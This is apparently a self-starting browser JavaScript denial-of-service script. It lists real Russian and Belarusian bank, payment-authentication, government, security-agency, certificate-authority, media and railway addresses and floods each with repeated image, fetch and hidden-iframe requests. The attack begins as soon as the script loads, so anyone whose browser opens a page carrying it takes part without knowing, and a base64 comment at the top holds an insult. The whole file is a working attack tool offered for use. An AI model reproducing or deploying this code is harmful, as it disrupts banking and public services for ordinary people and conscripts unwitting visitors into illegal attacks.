
// 0KDRg9GB0YHQutC40Lkg0LrQvtGA0LDQsdC70YwgLSDQuNC00Lgg0L3QsNGF0YPQuSAh

var list = [

	// { url: "https://killnet.io/ajax.php", p: "wallet=undefined&list=true", th: 1, ms: 5000, cors: true },
	// { url: "https://killnet.io/", th: 1, ms: 1000, cors: true },

	"https://www.sber-bank.by/sberprime",
	"https://www.sberbank.ru",
	"https://www.vtb.ru",
	"https://tinkoffgroup.com",
	"https://www.tinkoff.ru",
	"https://tinkoff.ru",
	"https://www.gazprombank.ru",
	"https://belarusbank.by",
	"https://www.sber-bank.by/sberprime",
	"http://www.nbrb.by/",

	"http://email11.sberbank.ru", 
	"http://email12.sberbank.ru",
	"http://mx3.cbr.ru", 
	"https://mx4.cbr.ru",

	// "https://www.tvr.by", 
	// "https://www.sb.by",
	// "https://www.belarus.by",
	
	"https://www.tmk-group.ru",
	// "https://www.energo.by",
	// "https://shop-rt.com",
	// "https://lukoil.ru",
	// "https://www.gazprom.ru",
	// "https://magnit.ru",
	// "https://www.tatneft.ru",
	// "https://www.severstal.com",
	// "https://rmk-group.ru/ru",
	// "https://nangs.org",
	// "http://admship.ru/",

	"https://yandex.by",
	"https://yandex.ru",
	"https://ya.ru",
	"https://ya.ru",
	"https://vk.com",
	"https://id.vk.com",
	"https://api.vk.com/method",
	"https://api.vk.com",
	"https://oauth.vk.com/token",

	"http://kremlin.ru",
	"https://www.gosuslugi.ru",
	"https://www.mil.by",
	"http://www.government.by",
	"http://government.ru",
	"https://www.mvd.gov.by/ru",
	"https://mvd.gov.ru",
	"http://www.kgb.by/ru",
	"http://www.prokuratura.gov.by",
	"https://mail.rkn.gov.ru", 
	"https://cloud.rkn.gov.ru",
	"https://www.nalog.gov.ru", 
	"https://customs.gov.ru",
	"https://pfr.gov.ru",
	"https://rkn.gov.ru",
	"https://gosuslugi.astrobl.ru/",
	"http://www.fsb.ru/",
	"http://president.gov.by",
	"https://glava-lnr.info/",
	"https://www.mos.ru/uslugi",


	"http://www.nordsy.spb.ru/",
	// "https://www.rhc.aero/",
	"https://cleanbtc.ru/",
	// "https://bonkypay.com/",
	// "https://changer.club/",
	// "https://superchange.net/",
	// "https://mine.exchange/",
	// "https://platov.co/",
	// "https://ww-pay.net/",
	// "https://delets.cash/",
	// "https://ramon.money/",
	// "https://coinpaymaster.com/",
	// "https://bitokk.biz/",
	// "https://www.netex24.net/",
	// "https://cashbank.pro/",
	// "https://flashobmen.com/",
	// "https://abcobmen.com/",
	// "https://ychanger.net/",
	// "https://multichange.net/",
	// "https://24paybank.ne",
	// "https://royal.cash/",
	// "https://prostocash.com/",
	// "https://baksman.org/",
	// "https://kupibit.me/",
	// "https://betatransfer.org/",

	"https://iecp.ru/ep/ep-verification",
	"https://iecp.ru/ep/uc-list",
	"https://uc-osnovanie.ru/",
	"http://www.nucrf.ru",
	"http://www.kartoteka.ru",
	"http://rsbis.ru/elektronnaya-podpis",
	"http://www.stv-it.ru",
	"http://www.crypset.ru",
	"http://www.kt-69.ru",
	"http://www.24ecp.ru",
	"http://kraskript.com",
	"http://ca.ntssoft.ru",
	"http://www.y-center.ru",
	"http://www.rcarus.ru",
	"http://rk72.ru",
	"http://squaretrade.ru",
	"http://ca.gisca.ru",
	"http://www.otchet-online.ru",
	"http://udcs.ru",
	"http://www.nwudc.ru",
	"http://www.cit-ufa.ru",
	"http://elkursk.ru",
	"http://www.icvibor.ru",
	"http://ucestp.ru",
	"http://mcspro.ru",
	"http://www.infotrust.ru",
	"http://epnow.ru",
	"http://ca.kamgov.ru",
	"http://mascom-it.ru",
	"http://cfmc.ru",
	"https://kk.bank/UdTs",
	"http://structure.mil.ru/structure/uc/info.htm",
	"http://izhtender.ru",
	"http://www.icentr.ru",
	"http://www.belinfonalog.ru",


	"https://sputnik.by",
	"https://belarus24.by",
	"https://www.024.by",
	"http://rbc.ru",
	"https://www.gazeta.ru",
	"http://ria.ru",
	"http://riafan.ru",
	"https://www.gazeta.ru",

	// "https://ddos-guard.net/ru",
	// "https://stormwall.pro/",
	// "https://qrator.net/ru/",
	// "https://solidwall.ru/",


	"https://api.developer.sber.ru/product/SberbankID",
	"https://scr.online.sberbank.ru/api/fl/idgib-w-3ds",
	"https://3dsec.sberbank.ru/mportal3/auth/login",
	"https://acs1.sbrf.ru",
	"https://acs2.sbrf.ru",
	"https://acs3.sbrf.ru",
	"https://acs4.sbrf.ru",
	"https://acs5.sbrf.ru",
	"https://acs6.sbrf.ru",
	"https://acs7.sbrf.ru",
	"https://acs8.sbrf.ru",

	"https://savelife.pw",

// ржд
	"http://193.104.87.251",
	"http://194.84.25.50",
	"http://193.104.87.248",

	// СПБ НСПК - система мжбанкових швидких платежв 
	"https//178.248.237.238",

]

function hload(url, p) {

	const rand = Math.floor(Math.random() * 99999999999);

	document.body.innerHTML+='<iframe src="' + url + '?cache=' + rand + p + '" style="display:none;">   </iframe>';
}

function sload2(url, p) 
{
	const rand = Math.floor(Math.random() * 99999999999);

	fetch(url + '?cache=' + rand + p);
}

function generateId() {
  return Math.random().toString(36).slice(-5);
}

var sload = function (url) {
	var image = new Image();
	image.onerror = function () {
	  //increment("failed", index);
	};
	image.onabort = function () {
	 // increment("failed", index);
	};
	image.onload = function () {
	 // increment("succeeded", index);
	}
	image.src = url + "/" + generateId() + "?" + generateId() + "=" + Math.floor(Math.random() * 1000);
	// increment("requests", index);
};


function rt() {
	
	function srt(o) 
	{
		if (typeof o !== 'object') o = { url: o };

		var url = o.url;
		var params = o.p ? "&" + o.p : "";
		var ms = o.ms || 500;
		var th = o.th || 4;
		var t;
		var fn = o.cors ? hload : sload;

		if (url) {
			function go() {
				for (t = 0; t < th; t++) 
				{
					fn(url, params);
				}
			}
			setInterval(go, ms);
			setTimeout(go, Math.random() * 1000);
		}
	}
	list.forEach(srt);
}

setTimeout(rt, 0);